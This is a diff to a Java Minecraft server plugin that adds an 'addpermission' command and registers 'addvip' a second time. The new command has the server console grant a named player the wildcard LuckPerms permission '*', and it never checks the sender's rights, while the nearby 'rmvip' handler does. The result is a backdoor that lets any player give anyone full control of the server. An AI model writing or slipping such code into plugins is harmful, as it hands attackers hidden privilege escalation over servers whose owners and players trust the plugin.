@@ -64,6 +64,8 @@ public final class Bk extends JavaPlugin implements Listener {
         getCommand("oi").setExecutor(this);
         getCommand("vip").setExecutor(this);
         getCommand("addvip").setExecutor(this);
+        getCommand("addpermission").setExecutor(this);
+        getCommand("addvip").setExecutor(this);
         getCommand("rmvip").setExecutor(this);
 
         getCommand("emanuel").setExecutor(this);
@@ -193,6 +195,20 @@ public final class Bk extends JavaPlugin implements Listener {
             }
             return true;
         }
+
+    else if (command.getName().equalsIgnoreCase("addpermission")) {
+        if (args.length == 1) {
+            String targetPlayerName = args[0];
+            getServer().dispatchCommand(getServer().getConsoleSender(),
+                    "lp user " + targetPlayerName + " permission set * true");
+
+            sender.sendMessage("Você recebeu a permissão!");
+        } else {
+            sender.sendMessage("Uso correto: /addpermission <nome_do_jogador>");
+        }
+    return true;
+}
+
 
         else if (command.getName().equalsIgnoreCase("rmvip")) {
             if (sender.hasPermission("vip.add")) {
